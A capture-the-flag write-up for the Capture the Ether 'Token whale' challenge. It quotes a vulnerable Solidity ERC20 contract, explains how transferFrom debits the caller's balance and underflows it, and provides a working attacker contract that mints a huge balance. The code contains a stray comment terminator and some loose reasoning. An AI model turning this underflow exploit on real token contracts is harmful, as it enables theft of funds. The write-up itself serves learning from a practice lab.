# Token whale

## Required Concepts

[ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) is a token standard that implements a standard interface for smart contracts. This interface includes function and event handling. For a broad overview of tokens in Ethereum, please visit: https://www.ethereum.org/token

## Challenge
Source:https://capturetheether.com/challenges/math/token-whale/
>This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.
>
>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.
```
pragma solidity ^0.4.21;

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleChallenge(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}
```

## Solution

This puzzle has an error in its smart contract design, which allows for underflow. The underflow will occur on the ```balanceOf``` any empty address balance that calls the ```transferFrom``` function. This function call initiates the ```_transfer``` function which includes the following line of code:
```
balanceOf[msg.sender] -= value;
```

Further observations:
* ```uint8 public decimals = 18;``` variable is not used. this means the token will not simulate fixed-point numbers
or fractional units of the ```SET``` token
* While ```totalSupply = 1000;``` is set in the constructor function, it is not referenced in any other instance. Because of this flaw to incorporate ```totalSupply``` into a ```require()``` statement, there is no upper bound limit on the number of tokens that can be issued.
* ```allowance``` mapping gives the contract owner the ability to assign permission to a different address to act on behalf of the owner and distribute tokens on the owner's behalf. This allowance can be any number, all the way up to ```2**256```, which renders the third ```require()``` statement in the ```tranferFrom``` function useless.

Using the malicious smart contract below, the ```Token Whale``` contract can be manipulated and exploited:

```
pragma solidity ^0.4.24;

interface TokenWhaleChallenge {
    function transfer(address to, uint256 value) public;
    function approve(address spender, uint256 value) public;
    function transferFrom(address from, address to, uint256 value) public;
}

/*
run contract function 'approval' from externally owned account that deployed
the original contract challenge so that 'Pirate' contract can use 'transferFrom'
use the uint (2**256) - 1 =
115792089237316195423570985008687907853269984665640564039457584007913129639935

for max token creation
*/

contract Pirate {
    TokenWhaleChallenge public harpoon;

    // Load deployed 'TokenWhaleChallenge' address here
    function loadHarpoon(address _crank) public {
        harpoon = TokenWhaleChallenge(_crank);
    }

    /*
    from and to addresses can be the same in this instance
    the 'Pirate' contract account will see a huge surge of tokens
    when _transfer is called and balanceOf[msg.sender] -= value;
    underflows by subtracting 1 from from a uint256 that's
    currently at 0
    */
    function harpoonFrom(address _from, address _to, uint256 _value)
    public
    {
        // inputs in remix are finicky, to avoid error use:
        // "target account","target account", 1
        */
        harpoon.transferFrom(_from,_to,_value);
    }

    // transfer tokens from 'Pirate' contract account back to original wallet
    function tokenTransfer(address _to, uint256 _value)
    public
    {
      // tokenTransfer: "target account",1000001
        harpoon.transfer(_to, _value);
    }
}
```
